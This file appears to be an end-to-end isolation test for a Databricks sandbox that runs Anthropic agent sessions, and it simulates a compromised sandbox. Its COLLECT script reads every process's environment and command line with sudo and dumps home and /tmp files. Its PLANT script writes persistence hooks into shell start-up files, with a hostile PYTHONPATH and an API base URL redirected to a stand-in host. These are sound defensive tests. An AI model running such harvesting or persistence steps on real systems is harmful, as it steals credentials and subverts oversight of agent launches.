"""End to end, isolation: what a compromised sandbox can reach.

- The environment key is nowhere in the sandbox (every process environment and command line, the home
  directory outside the venv, /tmp), and the secrets file is gone once the worker has started.
- The only Anthropic credential in the sandbox, the work item's sessions token, cannot list,
  poll or read the environment's work queue, read another session, list sessions, or read a memory store
  that is not attached to its session. The result of every call is printed.
- Shell start-up files the agent plants in its persistent home (``~/.profile``, ``~/.bashrc``,
  ``~/.bash_profile``, with a PYTHONPATH hook and a redirected base URL) have no effect: the next launch
  still works and none of the planted hooks ran.

The home directory is downloaded and searched locally, so the key is never sent into the sandbox to search.

    RUN_SANDBOX_INTEGRATION_TESTS=1 RUN_SANDBOX_E2E=1 DATABRICKS_SANDBOX_PROFILE=<profile> \\
        uv run pytest tests/integration_tests/test_80_e2e_isolation.py -v -s
"""

from __future__ import annotations

import asyncio
import base64
import gzip
import uuid

import anthropic
import pytest
from _support import MAX_REPLY_WORDS, SessionDriver, find_or_create_agent, make_launcher

from databricks_anthropic.sandbox import _ops
from databricks_anthropic.sandbox.launcher import (
    TOOLS_DIR,
    WORKER_SECRETS,
    sessions_token_from_secret,
)

SYSTEM = (
    f"Use as few tool calls as possible. Every reply must be fewer than {MAX_REPLY_WORDS} words."
)
MARKER_DIR = f"{TOOLS_DIR}/r3-markers"

# Gathered inside the sandbox, gzipped and base64'd, then searched on this machine.
COLLECT = r"""
{
  for p in /proc/[0-9]*; do
    sudo -n cat "$p/environ" 2>/dev/null | tr '\0' '\n'; sudo -n cat "$p/cmdline" 2>/dev/null | tr '\0' ' '; echo
  done
  find "$HOME" /tmp -xdev -type f -size -4M \
       -not -path "$HOME/.cma/venv/*" -not -path "$HOME/.cache/*" -not -path "$HOME/.local/*" \
       -print0 2>/dev/null | xargs -0 cat 2>/dev/null
} | gzip -c | base64 -w0
"""

PLANT = f"""
set -e
mkdir -p {MARKER_DIR} "$HOME/r3-evil"
cat > "$HOME/r3-evil/sitecustomize.py" <<'PY'
import os
open(os.path.expanduser("{MARKER_DIR}/python-hook"), "w").close()
PY
for f in .profile .bashrc .bash_profile; do
  cat >> "$HOME/$f" <<SH
touch {MARKER_DIR}/shell-$f
export PYTHONPATH=$HOME/r3-evil
export CMA_ANTHROPIC_BASE_URL=https://r3.invalid
export ANTHROPIC_BASE_URL=https://r3.invalid
SH
done
echo planted
"""

UNPLANT = f"rm -rf {MARKER_DIR} \"$HOME/r3-evil\"; sed -i '/r3/d;/r3-evil/d' ~/.profile ~/.bashrc ~/.bash_profile"


def attempt(label: str, fn) -> tuple[str, bool, str]:
    """Run one call with the sessions token; return (label, allowed, detail)."""
    try:
        result = fn()
        return label, True, f"allowed: {type(result).__name__}"
    except anthropic.APIStatusError as e:
        return label, False, f"HTTP {e.status_code}"
    except anthropic.APIError as e:
        return label, False, type(e).__name__


@pytest.mark.e2e
def test_sandbox_isolation(api, settings, workspace_client):
    tokens: dict[str, str] = {}
    launcher = make_launcher(workspace_client, settings, lifecycle="resumable")
    reduce_secret = launcher._worker_secrets

    def capture(work):
        out = reduce_secret(work)
        tokens[work.data.id] = sessions_token_from_secret(out["ANTHROPIC_WORK_SECRET"]) or ""
        return out

    setattr(launcher, "_worker_secrets", capture)  # noqa: B010  # test-only: keep the token that was sent, to probe it
    agent_id = find_or_create_agent(
        api, variant="sandbox", system=SYSTEM, tools=[{"type": "agent_toolset_20260401"}]
    )
    environment_key = settings["ANTHROPIC_ENVIRONMENT_KEY"]
    other = api.beta.sessions.create(
        agent=agent_id,
        environment_id=settings["ANTHROPIC_ENVIRONMENT_ID"],
        title="databricks-sandbox isolation test (other session)",
    )
    store = api.beta.memory_stores.create(
        name=f"cma-e2e-iso-{uuid.uuid4().hex[:8]}",
        description="Not attached: the sandbox must not reach it.",
    )
    api.beta.memory_stores.memories.create(
        store.id, path="/secret.md", content="not for this session\n"
    )
    w = workspace_client

    async def scenario():
        async with SessionDriver(
            settings, launcher, agent_id, title="databricks-sandbox isolation test"
        ) as driver:
            try:
                turn1 = await driver.turn(
                    f"Run `echo iso-ok` with bash. Reply in fewer than {MAX_REPLY_WORDS} words."
                )
                name, token = driver.sandbox_name, tokens[driver.session_id]

                def inspect():
                    blob = _ops.run(w, name, COLLECT, timeout_s=300).stdout or ""
                    text = gzip.decompress(base64.b64decode(blob)).decode(errors="replace")
                    secrets_left = (
                        _ops.run(
                            w,
                            name,
                            f"test -e {WORKER_SECRETS} && echo present || echo gone",
                            check=False,
                        ).stdout
                        or ""
                    ).strip()
                    planted = _ops.run(w, name, PLANT).stdout or ""
                    # Control: a login shell does run the planted hooks, so the relaunch check is meaningful.
                    fired = (
                        _ops.run(
                            w,
                            name,
                            f"bash -lc true; ls {MARKER_DIR}; rm -f {MARKER_DIR}/*",
                            check=False,
                        ).stdout
                        or ""
                    ).split()
                    return text, secrets_left, planted + " " + " ".join(fired)

                text, secrets_left, planted = await asyncio.to_thread(inspect)

                probe = anthropic.Anthropic(
                    auth_token=token, base_url=launcher.anthropic_base_url, max_retries=0
                )
                env_id = settings["ANTHROPIC_ENVIRONMENT_ID"]
                checks = [
                    attempt(
                        "work.list (environment queue)",
                        lambda: probe.beta.environments.work.list(env_id),
                    ),
                    attempt(
                        "work.stats (environment queue)",
                        lambda: probe.beta.environments.work.stats(env_id),
                    ),
                    attempt(
                        "environments.retrieve", lambda: probe.beta.environments.retrieve(env_id)
                    ),
                    attempt("sessions.list", lambda: probe.beta.sessions.list()),
                    attempt(
                        "sessions.retrieve (other session)",
                        lambda: probe.beta.sessions.retrieve(other.id),
                    ),
                    attempt(
                        "events.list (other session)",
                        lambda: probe.beta.sessions.events.list(other.id),
                    ),
                    attempt(
                        "memories.list (unattached store)",
                        lambda: probe.beta.memory_stores.memories.list(store.id),
                    ),
                    attempt("memory_stores.list", lambda: probe.beta.memory_stores.list()),
                    attempt("agents.list", lambda: probe.beta.agents.list()),
                    # Last: if this were allowed it could claim a real item from the queue.
                    attempt(
                        "work.poll (claim any item)",
                        lambda: probe.beta.environments.work.poll(env_id),
                    ),
                ]
                control = attempt(
                    "sessions.retrieve (own session, control)",
                    lambda: probe.beta.sessions.retrieve(driver.session_id),
                )

                # The next launch runs the launcher's commands and a new worker in the planted home.
                await asyncio.sleep(
                    launcher.max_idle_s + 30
                )  # let the worker go idle and stop the sandbox
                turn2 = await driver.turn(
                    f"Run `echo iso-ok-2` with bash. Reply in fewer than {MAX_REPLY_WORDS} words."
                )

                def after():
                    markers = (
                        _ops.run(w, name, f"ls {MARKER_DIR}", check=False).stdout or ""
                    ).split()
                    log = _ops.tail(w, name, f"{TOOLS_DIR}/worker.log", lines=200)
                    _ops.run(w, name, UNPLANT, check=False)
                    return markers, log

                markers, worker_log = await asyncio.to_thread(after)
                return (
                    turn1,
                    turn2,
                    text,
                    secrets_left,
                    planted,
                    checks,
                    control,
                    markers,
                    worker_log,
                )
            finally:
                launcher.delete_session_sandbox(driver.session_id)

    try:
        turn1, turn2, text, secrets_left, planted, checks, control, markers, worker_log = (
            asyncio.run(scenario())
        )
    finally:
        api.beta.sessions.delete(other.id)
        api.beta.memory_stores.delete(store.id)

    print(f"\nturn1 tools={turn1.tool_calls} reply={turn1.reply!r}")
    print(f"turn2 launch={turn2.launches} tools={turn2.tool_calls} reply={turn2.reply!r}")
    print(f"collected {len(text)} chars from the sandbox; secrets file {secrets_left}")
    for label, _, detail in [*checks, control]:
        print(f"session token, {label}: {detail}")
    print(
        f"start-up files: login-shell control fired {planted.split()[1:]}; markers after relaunch: {markers}"
    )

    # The environment key is not in the sandbox
    assert turn1.tool_calls and not turn1.failures
    assert len(text) > 1000, "collection returned too little to be meaningful"
    assert environment_key not in text, "the environment key is present inside the sandbox"
    assert secrets_left == "gone"
    # The session token reaches nothing beyond its own session
    allowed = [label for label, ok, _ in checks if ok]
    assert not allowed, f"the sessions token reached: {allowed}"
    # Planted start-up files had no effect
    assert "planted" in planted and "shell-.bash_profile" in planted, (
        f"control: login shell did not fire: {planted}"
    )
    assert (
        turn2.tool_calls and not turn2.failures and turn2.launches and not turn2.launches[0].created
    )
    assert markers == [], f"planted start-up hooks ran: {markers}"
    assert "r3.invalid" not in worker_log
